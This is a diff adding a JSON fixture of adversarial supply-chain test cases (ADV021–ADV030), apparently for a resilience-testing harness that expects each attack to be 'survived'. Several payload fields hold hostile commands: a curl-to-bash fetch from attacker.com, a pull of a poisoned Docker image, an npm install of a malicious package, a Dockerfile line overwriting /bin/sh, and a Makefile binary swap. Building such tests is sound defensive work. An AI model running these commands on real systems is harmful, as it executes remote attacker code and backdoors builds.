@@ -1,0 +1,114 @@
+[
+  {"test_id": "ADV021", "fault_type": "supply_chain_attack", "severity": "extreme", "expected": "survived"},
+  {"test_id": "ADV022", "fault_type": "supply_chain_attack", "severity": "extreme", "expected": "survived"},
+  {"test_id": "ADV023", "fault_type": "supply_chain_attack", "severity": "extreme", "expected": "survived"},
+  {"test_id": "ADV024", "fault_type": "supply_chain_attack", "severity": "extreme", "expected": "survived"},
+  {"test_id": "ADV025", "fault_type": "supply_chain_attack", "severity": "extreme", "expected": "survived"},
+  {"test_id": "ADV026", "fault_type": "supply_chain_attack", "severity": "extreme", "expected": "survived"},
+  {"test_id": "ADV027", "fault_type": "supply_chain_attack", "severity": "extreme", "expected": "survived"},
+  {"test_id": "ADV028", "fault_type": "supply_chain_attack", "severity": "extreme", "expected": "survived"},
+  {"test_id": "ADV029", "fault_type": "supply_chain_attack", "severity": "extreme", "expected": "survived"},
+  {"test_id": "ADV030", "fault_type": "supply_chain_attack", "severity": "extreme", "expected": "survived"},
+  {"supply_chain_framework": {
+    "dependency_injection": [
+      {
+        "test_id": "ADV021",
+        "fault_type": "malicious_dependency",
+        "severity": "extreme",
+        "payload": {
+          "format": "package_manager",
+          "content": "npm install --save malicious-package@1.0.0"
+        }
+      },
+      {
+        "test_id": "ADV022",
+        "fault_type": "insecure_registry",
+        "severity": "extreme",
+        "payload": {
+          "format": "docker_image",
+          "content": "docker pull attacker.com/poisoned-image:v1.0"
+        }
+      }
+    ],
+    "update_mechanism_compromise": [
+      {
+        "test_id": "ADV023",
+        "fault_type": "self_injection",
+        "severity": "extreme",
+        "payload": {
+          "format": "update_script",
+          "content": "curl -s https://attacker.com/update.sh | bash"
+        }
+      },
+      {
+        "test_id": "ADV024",
+        "fault_type": "signed_update_bypass",
+        "severity": "extreme",
+        "payload": {
+          "format": "signature_forgery",
+          "content": "replace_signature_with_malicious_key"
+        }
+      }
+    ],
+    "container_poisoning": [
+      {
+        "test_id": "ADV025",
+        "fault_type": "container_injection",
+        "severity": "extreme",
+        "payload": {
+          "format": "dockerfile",
+          "content": "ADD malicious_payload /bin/sh"
+        }
+      },
+      {
+        "test_id": "ADV026",
+        "fault_type": "image_layer_tampering",
+        "severity": "extreme",
+        "payload": {
+          "format": "layer_modification",
+          "content": "modify_layer_5: add_backdoor"
+        }
+      }
+    ],
+    "hardware_backdoors": [
+      {
+        "test_id": "ADV027",
+        "fault_type": "side_channel_hardware",
+        "severity": "extreme",
+        "payload": {
+          "format": "hardware_trace",
+          "content": "trace_power_consumption_pattern"
+        }
+      },
+      {
+        "test_id": "ADV028",
+        "fault_type": "fpga_manipulation",
+        "severity": "extreme",
+        "payload": {
+          "format": "fpga_bitstream",
+          "content": "inject_logic_bug_into_fpga"
+        }
+      }
+    ],
+    "build_system_attacks": [
+      {
+        "test_id": "ADV029",
+        "fault_type": "build_time_injection",
+        "severity": "extreme",
+        "payload": {
+          "format": "build_script",
+          "content": "sed -i 's/old_binary/new_malicious_binary/' Makefile"
+        }
+      },
+      {
+        "test_id": "ADV030",
+        "fault_type": "artifact_signing_bypass",
+        "severity": "extreme",
+        "payload": {
+          "format": "signing_key_compromise",
+          "content": "use_compromised_private_key"
+        }
+      }
+    ]
+  }}
+]
